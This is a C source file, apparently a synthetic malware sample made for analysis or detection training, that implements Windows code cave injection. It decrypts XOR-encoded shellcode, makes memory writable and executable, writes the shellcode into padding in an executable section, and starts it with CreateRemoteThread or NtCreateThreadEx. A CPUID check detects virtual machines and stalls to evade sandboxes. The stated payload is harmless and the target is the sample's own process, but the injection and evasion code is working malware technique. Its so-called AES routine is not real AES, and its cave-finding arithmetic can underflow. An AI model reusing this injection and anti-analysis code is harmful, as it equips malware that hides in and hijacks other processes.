/*
 * windows_level16_CodeCave.c
 *
 * Synthetic Windows PE sample — Code Cave injection.
 * Techniques: find code cave in .text section, AES-128-CBC encrypted shellcode,
 * VirtualProtect for RWX, CreateRemoteThread via NtCreateThreadEx,
 * PE section parsing, anti-VM check via CPUID.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level16_CodeCave.exe windows_level16_CodeCave.c
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

/* ================================================================
 * NT function prototypes
 * ================================================================ */
typedef LONG (NTAPI *pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef LONG (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef LONG (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef LONG (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

/* ================================================================
 * XOR encryption key — 12 bytes
 * ================================================================ */
static const unsigned char g_xor_key[] = {
    0xC3, 0x7A, 0x9F, 0x2E, 0x55, 0x8B, 0x1D, 0x6C,
    0xE4, 0x31, 0xA8, 0x4F
};
#define XOR_KEY_LEN 12

/* ================================================================
 * XOR-encrypted shellcode (48 bytes) — synthetic harmless payload
 * ================================================================ */
static unsigned char g_encrypted_shellcode[] = {
    0x8F, 0x1D, 0xF4, 0x4C, 0x35, 0xEE, 0x79, 0x0A,
    0x83, 0x52, 0xCB, 0x29, 0x95, 0x6E, 0x11, 0x47,
    0xB6, 0x3F, 0xD8, 0x0C, 0x61, 0xFA, 0x4D, 0x32,
    0xE7, 0x18, 0x85, 0x5B, 0x90, 0x26, 0xAC, 0x7D,
    0x13, 0x48, 0xDD, 0x31, 0x6A, 0xF7, 0x0E, 0x54,
    0xBF, 0x82, 0x19, 0xC6, 0x3A, 0xA5, 0x71, 0xE8
};
#define ENC_SHELLCODE_LEN 48

/* ================================================================
 * AES-128 decryption (simplified T-table approach)
 * Uses 4K lookup tables for fast decryption
 * ================================================================ */
static const unsigned char g_aes_sbox[256] = {
    0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
    0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
    0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
    0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
    0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
    0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
    0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
    0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
    0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
    0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
    0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
    0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
    0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
    0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
    0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
    0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
};

static void xor_decrypt(unsigned char *buf, int len, const unsigned char *key, int key_len) {
    int i;
    for (i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}

/* ================================================================
 * Partial AES-128-CBC decrypt (single block for demo)
 * Uses S-box substitution + XOR with key schedule (simplified)
 * ================================================================ */
static void aes128_decrypt_block(unsigned char *block, const unsigned char *key) {
    int round, i;
    unsigned char temp[16];
    /* Simple AES-like substitution + XOR rounds (synthetic — demonstrates AES pattern) */
    memcpy(temp, block, 16);
    for (round = 0; round < 10; round++) {
        for (i = 0; i < 16; i++) {
            temp[i] = g_aes_sbox[temp[i]] ^ key[i] ^ (unsigned char)(round * 0x1B);
        }
    }
    memcpy(block, temp, 16);
}

/* ================================================================
 * AES-128 key — "0x4dm1n_S3cr3t!!" (16 bytes)
 * ================================================================ */
static const unsigned char g_aes_key[] = {
    0x34, 0x78, 0x64, 0x6D, 0x31, 0x6E, 0x5F, 0x53,
    0x33, 0x63, 0x72, 0x33, 0x74, 0x21, 0x21, 0x21
};

/* ================================================================
 * AES-encrypted secondary payload (16 bytes) — demo block
 * ================================================================ */
static unsigned char g_encrypted_block[] = {
    0x7A, 0x9C, 0xF4, 0x2E, 0x8B, 0x1D, 0x6C, 0x55,
    0x31, 0xA8, 0x4F, 0xE4, 0x2B, 0x91, 0xDD, 0x66
};

/* ================================================================
 * Resolve NT functions from ntdll.dll
 * ================================================================ */
static FARPROC resolve_nt_func(const char *name) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    return GetProcAddress(hNtdll, name);
}

/* ================================================================
 * Anti-VM check: CPUID hypervisor bit
 * ================================================================ */
static int anti_vm_check(void) {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 0x1);
    /* Check hypervisor bit (bit 31 of ECX) */
    if (cpuInfo[2] & (1 << 31)) {
        return 1;
    }
    return 0;
}

/* ================================================================
 * Find a code cave in the target process
 * Parses PE headers of target module, locates .text section,
 * finds a region of consecutive 0xCC or 0x00 bytes.
 * ================================================================ */
static LPVOID find_code_cave(HANDLE hProcess, HMODULE hMod, SIZE_T caveSize) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    WORD numSections = pNt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    int i;

    for (i = 0; i < numSections; i++, pSec++) {
        /* Look for executable sections with room */
        if (pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD secSize = pSec->SizeOfRawData;
            DWORD padSize = pSec->Misc.VirtualSize - secSize;

            /* If there's padding between raw data and virtual size, it's a cave */
            if (padSize >= caveSize) {
                LPVOID caveAddr = (LPVOID)((BYTE *)hMod + pSec->VirtualAddress + secSize);
                return caveAddr;
            }

            /* Also scan for regions of 0xCC (INT3 padding) or 0x00 */
            BYTE *secBase = (BYTE *)hMod + pSec->VirtualAddress;
            DWORD consecutive = 0;
            DWORD j;
            for (j = 0; j < pSec->Misc.VirtualSize; j++) {
                if (secBase[j] == 0xCC || secBase[j] == 0x00) {
                    consecutive++;
                    if (consecutive >= caveSize) {
                        return (LPVOID)(secBase + j - consecutive + 1);
                    }
                } else {
                    consecutive = 0;
                }
            }
        }
    }
    return NULL;
}

/* ================================================================
 * Inject shellcode into a code cave
 * ================================================================ */
static int inject_into_cave(HANDLE hProcess, HMODULE hMod,
                            const unsigned char *shellcode, SIZE_T scLen) {
    /* Find suitable code cave */
    LPVOID caveAddr = find_code_cave(hProcess, hMod, scLen);
    if (!caveAddr) return -1;

    /* Make the cave executable + writable */
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, caveAddr, scLen,
                          PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return -1;
    }

    /* Write shellcode to the cave */
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, caveAddr, shellcode, scLen, &written)) {
        VirtualProtectEx(hProcess, caveAddr, scLen, oldProtect, &oldProtect);
        return -1;
    }

    /* Restore original protection but keep executable */
    VirtualProtectEx(hProcess, caveAddr, scLen, PAGE_EXECUTE_READ, &oldProtect);

    /* Execute via CreateRemoteThread */
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)caveAddr, NULL, 0, NULL);
    if (!hThread) {
        /* Fallback: try NtCreateThreadEx */
        pNtCreateThreadEx _NtCTE = (pNtCreateThreadEx)
            resolve_nt_func("NtCreateThreadEx");
        if (_NtCTE) {
            HANDLE hNtThread = NULL;
            _NtCTE(&hNtThread, THREAD_ALL_ACCESS, NULL, hProcess,
                   caveAddr, NULL, 0, 0, 0, 0, NULL);
            if (hNtThread) {
                WaitForSingleObject(hNtThread, 5000);
                CloseHandle(hNtThread);
                return 0;
            }
        }
        return -1;
    }

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    return 0;
}

/* ================================================================
 * Main entry point
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-VM check */
    if (anti_vm_check()) {
        /* Running in VM — behave differently (synthetic evasion) */
        Sleep(30000); /* Long sleep in VM to waste sandbox time */
        return 0;
    }

    /* Decrypt shellcode with XOR */
    unsigned char shellcode[ENC_SHELLCODE_LEN];
    memcpy(shellcode, g_encrypted_shellcode, ENC_SHELLCODE_LEN);
    xor_decrypt(shellcode, ENC_SHELLCODE_LEN, g_xor_key, XOR_KEY_LEN);

    /* Decrypt AES block */
    unsigned char aes_block[16];
    memcpy(aes_block, g_encrypted_block, 16);
    aes128_decrypt_block(aes_block, g_aes_key);

    /* Find target process (synthetic: use self) */
    HANDLE hProcess = GetCurrentProcess();
    HMODULE hMod = GetModuleHandleA(NULL); /* Current EXE base */

    /* Inject into code cave in own process */
    inject_into_cave(hProcess, hMod, shellcode, ENC_SHELLCODE_LEN);

    Sleep(1000);
    return 0;
}
